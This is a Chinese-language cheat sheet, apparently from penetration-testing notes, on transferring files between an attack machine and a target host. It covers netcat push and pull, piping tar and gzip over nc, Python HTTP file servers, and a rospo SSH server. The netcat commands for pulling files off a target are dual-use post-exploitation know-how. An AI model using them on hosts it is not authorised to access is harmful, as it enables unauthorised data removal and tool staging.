# 文件传输

## 传输技巧

### 分块传输

发送方拆分文件

```
split -b 1M large_file chunk_
```



接收方合并

```
cat chunk_* > large_file
```



## nc

Netcat (nc) 是一个功能强大的网络工具，可用于在 Linux 主机之间传输文件。假设 Linux1 是攻击机，Linux2 是靶机，以下是四种不同的文件传输方式：



**上传文件到靶机**：linux1 发送文件到 linux2

**接收方监听**

在接收方 (linux2) 上启动监听：

```bash
nc -l -p 1234 > received_file
```

在发送方 (linux1) 上发送文件：

```bash
nc linux2的IP 1234 < file_to_send
```



**发送方监听**

在发送方 (linux1) 上启动监听并准备发送：

```bash
nc -l -p 1234 < file_to_send
```

在接收方 (linux2) 上连接并接收：

```bash
nc linux1的IP 1234 > received_file
```



**下载文件到攻击机**：linux2 从 linux1 拉取文件

**发送方监听**

在发送方 (linux1) 上准备文件并监听：

```bash
nc -l -p 1234 < file_to_send
```

在接收方 (linux2) 上主动连接并接收：

```bash
nc linux1的IP 1234 > pulled_file
```



**接收方监听**

在接收方 (linux1) 上启动监听：

```bash
nc -l -p 1234 > pushed_file
```

在发送方 (linux2) 上推送文件：

```bash
nc linux1的IP 1234 < file_to_push
```



**验证文件**

传输完成后，建议验证文件：

```bash
# 发送方
md5sum original_file

# 接收方
md5sum received_file
```

- 两个 MD5 值应该相同。



**高级用法**

**传输整个目录**

发送方：

```bash
tar -czf - directory_name | nc -l -p 1234
```

接收方：

```bash
nc 发送方IP 1234 | tar -xzf -
```



**使用压缩传输**

发送方：

```bash
gzip -c file | nc -l -p 1234
```

接收方：

```bash
nc 发送方IP 1234 | gunzip -c > file
```



## http_py

Python 自带的 `http.server` 模块快速启动一个 HTTP 文件服务器，允许他人访问指定端口下载文件。

### Python2

启动 HTTP 服务器**（默认端口 8000）**

```
python2 -m SimpleHTTPServer 8000
```

Python 2 的 `SimpleHTTPServer` 模块（基于 `BaseHTTPServer`）功能较为简单，**不支持额外参数**，只能通过命令行指定端口（默认 `8000`）。



**访问方式**：浏览器访问 `http://<你的IP>:8000` 即可浏览和下载文件。

![image-20250401171916051](./images/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.assets/image-20250401171916051.png)







### Python3

启动 HTTP 服务器**（默认端口 8000，当前目录为 Web 根目录）**

```
python3 -m http.server 8000
```



**基本参数**

| 参数                     | 说明                                                         |
| ------------------------ | ------------------------------------------------------------ |
| `PORT`                   | 指定端口（默认 `8000`）                                      |
| `--bind ADDRESS` (`-b`)  | 绑定到特定 IP（默认 `localhost`，`0.0.0.0` 允许所有网络访问） |
| `--directory DIR` (`-d`) | 指定共享的目录（默认当前目录）                               |
| `--cgi`                  | 启用 CGI 脚本支持（需目录下有 `cgi-bin` 子目录）             |



绑定所有 IP，端口 8080，共享 /tmp 目录

```
python3 -m http.server 8080 --bind 0.0.0.0 --directory /tmp
```



IPv6 支持

```
python3 -m http.server --bind :: 8000
```



后台运行（Linux）

```
nohup python3 -m http.server 8000 > /dev/null 2>&1 &
```



## rospo

在终端执行执行以下命令，使用 rospo 工具启动一个 ssh 服务。

```
rospo sshd -P :4444
```



使用 sftp 工具（如：FileZilla）可以连接 rospo sshd 服务。

